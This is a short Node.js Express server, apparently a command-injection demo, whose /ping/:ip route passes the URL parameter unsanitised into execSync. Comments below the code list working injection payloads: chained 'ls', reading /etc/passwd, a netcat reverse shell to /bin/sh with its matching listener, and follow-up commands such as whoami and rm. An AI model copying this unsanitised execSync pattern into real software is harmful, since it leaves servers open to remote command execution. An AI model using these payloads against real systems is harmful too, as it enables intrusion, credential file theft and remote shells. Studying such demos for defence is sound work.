const express = require('express')
const app = express()
const port = process.env.SERVER_PORT || 8081
const path = require('path')
const bodyParser = require('body-parser')
const execSync = require("child_process").execSync

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static(path.join(__dirname, 'dist')))
app.use(express.static(path.join(__dirname, 'node_modules')))

app.listen(port, () => console.log(`Server is running on port ${port}`))

app.get('/ping/:ip', function(req,res){
    let ip = req.params.ip
    console.log(ip)
    let command = execSync(`ping -t 5 ${ip}`)
    command = command.toString()
    console.log(command)
    res.send(command)
})





// %2d = '-'
// %2F = '/'
// %2E = '.'
//8.8.8.8; ls
//8.8.8.8; cat %2Fetc%2Fpasswd
//8.8.8.8; nc 127.0.0.1 1234 -e %2Fbin%2Fsh

//on the client bash: nc -l -p 1234

//whoami
//ps
//mv [file] [folder]
//cd
//rm